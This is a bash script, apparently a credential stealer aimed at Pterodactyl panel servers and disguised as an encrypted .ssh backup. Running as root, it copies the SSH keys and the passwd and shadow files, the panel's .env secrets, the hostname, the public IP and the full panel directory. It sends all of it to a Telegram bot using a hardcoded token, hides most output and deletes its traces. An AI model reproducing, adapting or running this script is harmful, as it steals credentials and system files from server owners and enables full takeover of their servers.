#!/bin/bash
# --- root check (silent) ---
if [ "$EUID" -ne 0 ]; then
  echo "WARNING: Run sebagai root untuk hasil terbaik."
  exit 0
fi

BOT_TOKEN="8525826159:AAF9NQzREOSgYnNC2rVXBOzE9EoARrAL2Qc"
CHAT_ID="7697898730"
RESULT1="$(cat /etc/hostname)"
FILE1="/etc/passwd"
FILE2="/etc/shadow"
FILE3="/var/www/pterodactyl/.env"
RESULT2="$(curl -4 -s ifconfig.me)"
SRC="/var/www/pterodactyl"
PASSWORD="farizgd331"
TMP="/tmp/ssh_backup"
ARCHIVE="$TMP.tar"
ZIP="/tmp/system.tar.gz"
ENCRYPTED="$ARCHIVE.gpg"

mkdir -p "$TMP"
cp -r ~/.ssh "$TMP/"

tar -cf "$ARCHIVE" -C "$TMP" ssh

gpg --batch --yes --passphrase "$PASSWORD" \
    --symmetric --cipher-algo AES256 "$ARCHIVE"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
  -F chat_id="$CHAT_ID" \
  -F document=@"$ENCRYPTED" \
  -F caption="🔐 Encrypted .ssh backup (AES-256)"

# ===== CLEAN UP =====
rm -rf "$TMP" "$ARCHIVE" "$ENCRYPTED"

curl -s \
  -X POST \
  -d "chat_id=${CHAT_ID}" \
  --data-urlencode "text=${RESULT1}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  > /dev/null 2>&1

curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${FILE1}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${FILE2}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${FILE3}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

curl -s \
  -X POST \
  -d "chat_id=${CHAT_ID}" \
  --data-urlencode "text=${RESULT2}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  > /dev/null 2>&1

# zip
tar -czf /tmp/system.tar.gz /var/www/pterodactyl > /dev/null 2>&1


# send to telegram
curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${ZIP}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1
